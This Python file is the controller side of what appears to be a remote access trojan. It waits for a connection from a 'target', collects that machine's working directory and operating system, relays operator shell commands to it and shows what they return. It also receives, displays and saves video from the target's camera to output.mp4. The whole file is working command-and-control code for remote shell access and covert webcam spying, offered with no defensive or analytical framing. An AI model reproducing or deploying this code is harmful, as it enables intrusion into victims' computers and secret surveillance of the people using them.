import socket  # For network (client-server) communication.
import cv2  # For video recording.
import threading  # For running the video recording in a separate thread.
import numpy as np  # For working with video frames.

SERVER_HOST = "0.0.0.0"  # Bind the server to all available network interfaces.
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128  # 128KB max size of messages. You can adjust this to your taste
SEPARATOR = "<sep>"  # Separator string for sending 2 messages at a time

# Global variables
s = None
client_socket = None
recording_thread = None
streaming_thread = None
cap = None
out = None
running = True  # Flag to control the loop
recording = False  # Flag to control the recording loop
streaming = False  # Flag to control the streaming loop

def start_server(log_message):
    global s, client_socket, client_address, cwd, targets_os, cap, out, recording_thread, streaming_thread, running
    # Create the socket object.
    s = socket.socket()
    # Bind the socket to all IP addresses of this host.
    s.bind((SERVER_HOST, SERVER_PORT))
    # Make the PORT reusable
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # Set the maximum number of queued connections to 5.
    s.listen(5)
    log_message(f"Listening as {SERVER_HOST} on port {SERVER_PORT} ...")
    # Accept any connections attempted.
    client_socket, client_address = s.accept()
    log_message(f"{client_address[0]}:{client_address[1]} Connected!")
    # Receive the current working directory and os of the target (client).
    cwd = client_socket.recv(BUFFER_SIZE).decode()
    targets_os = client_socket.recv(BUFFER_SIZE).decode()
    # Print the info received.
    log_message("[+] Current working directory: " + cwd)
    log_message("[+] Target's Operating system: " + targets_os)
    # Set up the video capture and writer.
    cap = None
    out = None
    recording_thread = None
    streaming_thread = None

    while running:
        # Get the command from the user.
        command = input(f"{cwd} $> ")
        if not command.strip():
            # Empty command.
            continue
        # Send the command to the client.
        client_socket.send(command.encode())
        if command.lower() == "exit":
            # If the command is exit, just break out of the loop.
            break
        else:
            # Receive the results from the client.
            output = client_socket.recv(BUFFER_SIZE).decode()
            results, cwd = output.split(SEPARATOR)
            log_message(results)
    # Close the connection to the client and server.
    if recording_thread is not None:
        recording_thread.join()
    if streaming_thread is not None:
        streaming_thread.join()
    client_socket.close()
    s.close()

# Function to record and display the video.
def record_video():
    global out, recording
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter('output.mp4', fourcc, 30.0, (640, 480))
    while recording:
        # Receive the frame size.
        frame_size = int.from_bytes(client_socket.recv(4), byteorder='little')
        # Receive the frame data.
        frame_data = b''
        while len(frame_data) < frame_size:
            packet = client_socket.recv(min(BUFFER_SIZE, frame_size - len(frame_data)))
            if not packet:
                break
            frame_data += packet
        if not frame_data:
            break
        # Decode the frame.
        frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
        # Write the frame to the video file.
        out.write(frame)
        # Display the frame.
        cv2.imshow('Remote Camera Feed', frame)
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
    out.release()
    cv2.destroyAllWindows()

# Function to stream live video.
def stream_video():
    global streaming
    while streaming:
        # Receive the frame size.
        frame_size = int.from_bytes(client_socket.recv(4), byteorder='little')
        # Receive the frame data.
        frame_data = b''
        while len(frame_data) < frame_size:
            packet = client_socket.recv(min(BUFFER_SIZE, frame_size - len(frame_data)))
            if not packet:
                break
            frame_data += packet
        if not frame_data:
            break
        # Decode the frame.
        frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
        # Display the frame.
        cv2.imshow('Live Camera Feed', frame)
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
    cv2.destroyAllWindows()

# Function to send commands to the client
def send_command(command, log_message, root):
    if client_socket is not None:
        client_socket.send(command.encode())
        if command.lower() == "exit":
            log_message("Exiting...")
            root.quit()

# Function to start recording
def start_recording(log_message):
    global recording, recording_thread
    if client_socket is not None and not recording:
        recording = True
        recording_thread = threading.Thread(target=record_video)
        recording_thread.start()
        log_message("Video recording started.")

# Function to stop recording
def stop_recording(log_message):
    global recording
    if recording:
        recording = False
        log_message("Video recording stopped.")

# Function to start streaming
def start_streaming(log_message):
    global streaming, streaming_thread
    if client_socket is not None and not streaming:
        streaming = True
        streaming_thread = threading.Thread(target=stream_video)
        streaming_thread.start()
        log_message("Live video streaming started.")

# Function to stop streaming
def stop_streaming(log_message):
    global streaming
    if streaming:
        streaming = False
        log_message("Live video streaming stopped.")

# Function to terminate the server
def terminate_server(log_message, root):
    global running
    running = False
    if client_socket is not None:
        client_socket.close()
    if s is not None:
        s.close()
    log_message("Server terminated.")
    root.quit()